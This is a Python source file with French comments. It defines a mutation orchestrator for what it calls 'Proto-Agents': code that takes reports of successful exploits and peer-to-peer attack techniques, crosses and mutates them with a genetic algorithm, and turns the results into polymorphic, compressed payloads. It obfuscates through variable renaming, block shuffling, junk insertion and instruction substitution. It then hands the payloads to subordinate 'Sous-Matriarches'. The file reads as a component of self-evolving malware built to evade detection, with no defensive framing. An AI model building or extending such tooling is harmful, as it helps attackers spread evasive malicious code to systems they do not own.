"""Orchestrateur de mutations pour évolution des Proto-Agents"""
import random
import hashlib
import time
from typing import Dict, List, Optional


class MutationOrchestrator:
    """Gestion de l'évolution génétique des agents"""
    
    def __init__(self, brain):
        self.brain = brain
        self.mutation_history = []
        self.successful_traits = []
        self.mutation_rate = 0.15
        
    async def orchestrate_evolution(self, collected_intel: List[Dict]):
        """Orchestre les mutations basées sur l'intelligence collectée"""
        # Analyse des succès et échecs
        successful_techniques = self._analyze_successes(collected_intel)
        failed_approaches = self._analyze_failures(collected_intel)
        
        print(f"[Mutator] Found {len(successful_techniques)} successful techniques")
        
        # Génération nouvelle génération via algorithme génétique
        new_generation = self._genetic_crossover(successful_techniques)
        
        # Génération des payloads polymorphes
        mutated_payloads = []
        for technique in new_generation:
            payload = self._generate_polymorphic_code(technique)
            mutated_payloads.append(payload)
        
        # Distribution aux Sous-Matriarches
        await self._distribute_mutations(mutated_payloads)
        
        # Archivage
        self.mutation_history.append({
            'timestamp': time.time(),
            'generation': len(self.mutation_history) + 1,
            'payload_count': len(mutated_payloads),
            'base_techniques': len(successful_techniques)
        })
    
    def _analyze_successes(self, intel: List[Dict]) -> List[Dict]:
        """Analyse les techniques qui ont réussi"""
        successes = []
        
        for report in intel:
            # Extraction des échanges P2P réussis
            for exchange in report.get('p2p_exchanges', []):
                if exchange.get('success', False):
                    successes.append({
                        'type': 'p2p_technique',
                        'technique': exchange.get('technique'),
                        'target_type': exchange.get('target_type'),
                        'success_rate': exchange.get('success_rate', 1.0),
                        'code': exchange.get('code', '')
                    })
            
            # Extraction des exploitations réussies
            for discovery in report.get('discoveries', []):
                if discovery.get('type') == 'successful_exploit':
                    successes.append({
                        'type': 'exploit',
                        'technique': discovery.get('technique'),
                        'target_type': discovery.get('target_type'),
                        'vulnerability': discovery.get('vulnerability'),
                        'code': discovery.get('payload', '')
                    })
        
        return successes
    
    def _analyze_failures(self, intel: List[Dict]) -> List[Dict]:
        """Analyse les approches qui ont échoué"""
        failures = []
        
        for report in intel:
            for exchange in report.get('p2p_exchanges', []):
                if not exchange.get('success', True):
                    failures.append({
                        'technique': exchange.get('technique'),
                        'reason': exchange.get('failure_reason')
                    })
        
        return failures
    
    def _genetic_crossover(self, successful_techniques: List[Dict]) -> List[Dict]:
        """Algorithme génétique: croisement et mutation"""
        if len(successful_techniques) < 2:
            return successful_techniques
        
        new_generation = []
        generation_size = len(successful_techniques) * 2  # Doublement
        
        for _ in range(generation_size):
            # Sélection de deux parents
            parent1 = random.choice(successful_techniques)
            parent2 = random.choice(successful_techniques)
            
            # Croisement
            child = self._crossover(parent1, parent2)
            
            # Mutation aléatoire
            if random.random() < self.mutation_rate:
                child = self._mutate(child)
            
            new_generation.append(child)
        
        return new_generation
    
    def _crossover(self, parent1: Dict, parent2: Dict) -> Dict:
        """Croisement de deux techniques"""
        child = {
            'type': parent1['type'],
            'generation': self.mutation_history[-1]['generation'] + 1 if self.mutation_history else 1,
            'parents': [
                parent1.get('id', 'unknown'),
                parent2.get('id', 'unknown')
            ]
        }
        
        # Hybridation des caractéristiques
        if random.random() > 0.5:
            child['technique'] = parent1.get('technique')
            child['target_type'] = parent2.get('target_type')
        else:
            child['technique'] = parent2.get('technique')
            child['target_type'] = parent1.get('target_type')
        
        # Combinaison du code (simplifiée)
        code1 = parent1.get('code', '')
        code2 = parent2.get('code', '')
        
        if code1 and code2:
            # Prise de morceaux alternés
            child['code'] = self._combine_code(code1, code2)
        else:
            child['code'] = code1 or code2
        
        return child
    
    def _mutate(self, technique: Dict) -> Dict:
        """Applique une mutation aléatoire"""
        mutated = technique.copy()
        
        mutation_types = ['obfuscate', 'reorder', 'add_junk', 'substitute']
        mutation = random.choice(mutation_types)
        
        mutated['mutation_applied'] = mutation
        
        if 'code' in mutated:
            if mutation == 'obfuscate':
                mutated['code'] = self._obfuscate_code(mutated['code'])
            elif mutation == 'reorder':
                mutated['code'] = self._reorder_code(mutated['code'])
            elif mutation == 'add_junk':
                mutated['code'] = self._add_junk_code(mutated['code'])
            elif mutation == 'substitute':
                mutated['code'] = self._substitute_instructions(mutated['code'])
        
        return mutated
    
    def _generate_polymorphic_code(self, technique: Dict) -> Dict:
        """Génère un code polymorphe à partir d'une technique"""
        base_code = technique.get('code', '')
        
        # Obfuscation multi-couches
        obfuscated = self._rename_variables(base_code)
        obfuscated = self._shuffle_blocks(obfuscated)
        obfuscated = self._insert_junk(obfuscated, ratio=0.2)
        obfuscated = self._substitute_instructions(obfuscated)
        
        # Compression
        import zlib
        compressed = zlib.compress(obfuscated.encode())
        
        payload = {
            'payload': compressed,
            'hash': hashlib.sha256(compressed).hexdigest(),
            'parent_technique': technique.get('id', 'unknown'),
            'generation': technique.get('generation', 0) + 1,
            'technique_type': technique.get('type'),
            'created_at': time.time()
        }
        
        return payload
    
    def _rename_variables(self, code: str) -> str:
        """Renomme les variables pour obfuscation"""
        # Version simplifiée: remplacement de patterns communs
        import re
        
        # Recherche de noms de variables
        var_pattern = r'\b([a-z_][a-z0-9_]*)\b'
        variables = set(re.findall(var_pattern, code, re.IGNORECASE))
        
        # Exclusion des mots-clés
        keywords = {'if', 'else', 'for', 'while', 'def', 'class', 'import', 
                   'return', 'True', 'False', 'None'}
        variables -= keywords
        
        # Génération de nouveaux noms
        mapping = {var: f"var_{hashlib.md5(var.encode()).hexdigest()[:8]}" 
                  for var in variables}
        
        # Remplacement
        result = code
        for old, new in mapping.items():
            result = re.sub(rf'\b{old}\b', new, result)
        
        return result
    
    def _shuffle_blocks(self, code: str) -> str:
        """Réorganise les blocs de code"""
        lines = code.split('\n')
        
        # Groupement en blocs (simple: par fonction)
        blocks = []
        current_block = []
        
        for line in lines:
            if line.strip().startswith('def ') and current_block:
                blocks.append('\n'.join(current_block))
                current_block = [line]
            else:
                current_block.append(line)
        
        if current_block:
            blocks.append('\n'.join(current_block))
        
        # Mélange (sauf le premier bloc qui peut être l'import)
        if len(blocks) > 1:
            first_block = blocks[0]
            rest = blocks[1:]
            random.shuffle(rest)
            blocks = [first_block] + rest
        
        return '\n'.join(blocks)
    
    def _insert_junk(self, code: str, ratio: float = 0.2) -> str:
        """Insère du code inutile"""
        lines = code.split('\n')
        junk_count = int(len(lines) * ratio)
        
        junk_templates = [
            "x_{} = {} + {}",
            "tmp_{} = str({})",
            "_ = len(str({}))",
            "pass  # {}"
        ]
        
        for _ in range(junk_count):
            junk_line = random.choice(junk_templates).format(
                random.randint(1000, 9999),
                random.randint(1, 100),
                random.randint(1, 100)
            )
            
            # Insertion à position aléatoire
            pos = random.randint(0, len(lines))
            lines.insert(pos, "    " + junk_line)
        
        return '\n'.join(lines)
    
    def _substitute_instructions(self, code: str) -> str:
        """Substitue certaines instructions par des équivalents"""
        # Exemple simple: remplacer += par = x + 1
        import re
        
        # x += 1 -> x = x + 1
        code = re.sub(r'(\w+)\s*\+=\s*(\d+)', r'\1 = \1 + \2', code)
        
        # Autres substitutions possibles
        substitutions = {
            'True': '(1 == 1)',
            'False': '(1 == 0)',
            'None': '(1 if False else None)'
        }
        
        for old, new in substitutions.items():
            if random.random() < 0.3:  # 30% chance
                code = code.replace(old, new)
        
        return code
    
    def _obfuscate_code(self, code: str) -> str:
        """Obfuscation générale"""
        return self._rename_variables(code)
    
    def _reorder_code(self, code: str) -> str:
        """Réorganise le code"""
        return self._shuffle_blocks(code)
    
    def _add_junk_code(self, code: str) -> str:
        """Ajoute du code inutile"""
        return self._insert_junk(code)
    
    def _combine_code(self, code1: str, code2: str) -> str:
        """Combine deux codes"""
        lines1 = code1.split('\n')
        lines2 = code2.split('\n')
        
        # Alternance simple
        combined = []
        max_len = max(len(lines1), len(lines2))
        
        for i in range(max_len):
            if i < len(lines1):
                combined.append(lines1[i])
            if i < len(lines2):
                combined.append(lines2[i])
        
        return '\n'.join(combined)
    
    async def _distribute_mutations(self, payloads: List[Dict]):
        """Distribue les mutations aux Sous-Matriarches"""
        for sub in self.brain.sub_matriarches:
            # Sélection aléatoire de payloads pour cette Sub
            sub_payloads = random.sample(
                payloads,
                k=min(len(payloads), random.randint(1, 5))
            )
            
            # Stockage pour récupération
            content_id = f"mutations_{sub['id']}_{int(time.time())}"
            payload_data = str(sub_payloads).encode()
            
            self.brain.storage.store(content_id, payload_data)
            
            print(f"[Mutator] Distributed {len(sub_payloads)} mutations to {sub['id']}")
